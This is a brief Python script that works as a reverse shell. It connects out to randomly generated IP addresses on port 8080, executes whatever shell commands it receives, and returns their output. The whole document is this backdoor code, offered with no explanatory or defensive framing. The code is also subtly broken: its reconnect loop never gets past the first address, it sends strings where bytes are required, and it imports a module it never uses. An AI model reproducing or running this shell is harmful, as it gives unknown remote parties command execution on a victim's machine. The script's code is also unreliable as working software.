import socket
import subprocess
import requests
import random
import time

def random_ip_address():
    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def connect(ip):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 8080))
            while True:
                command = s.recv(1024)
                try:
                    output = subprocess.check_output(command, shell=True)
                    s.send(output)
                except:
                    s.send("Error executing command.\n")
            s.close()
        except:
            print("Disconnected. Reconnecting in 5 seconds...")
            time.sleep(5) # wait 5 seconds before attempting to reconnect

for i in range(5000): # Connect to 5,000 random IP addresses
    connect(random_ip_address())